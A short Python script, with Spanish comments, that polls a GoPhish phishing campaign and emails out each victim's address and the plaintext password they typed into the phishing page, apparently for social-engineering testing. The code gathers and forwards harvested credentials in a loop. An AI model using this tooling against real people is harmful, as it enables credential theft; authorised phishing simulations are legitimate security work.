from gophish import Gophish 
from time import sleep
import urllib3
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime

me = "EMAIL SENDER"
you = "EMAIL QUE RECIBE"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
api_key = 'API KEY DE GOPHISH' 
api = Gophish(api_key, verify=False) 
global enviados
campaign_id = 59 #CAMAPAÑA QUE QUEREMOS TRAKEAR
enviados = {}

def send_email(me, you, data):
  msg = MIMEMultipart('alternative')
  msg['Subject'] = "Resultados Ingenieria Social - Alerta datos introducidos"
  msg['From'] = me
  msg['To'] = you
  text = str(data)
  part1 = MIMEText(text, 'plain')
  msg.attach(part1)
  s = smtplib.SMTP('localhost')
  s.sendmail(me, you, msg.as_string())
  s.quit()


while True:
    campaign = api.campaigns.get(campaign_id=campaign_id) 
    data_dict = campaign.as_dict()
    timeline = data_dict["timeline"]
    for data in timeline:
        #print(data["message"])
        if data["message"] == "Submitted Data":
            #username = data["details"]["payload"]["username"]
            password = data["details"]["payload"]["password"] 
            email = data["email"]
            time = data["time"]
            if not enviados.get(email):
                print("se envia email", email)
                enviados[email] = [password, time]
                data = str(enviados)
                send_email(me, you, data)

    print(datetime.now(), enviados)
    sleep(10)
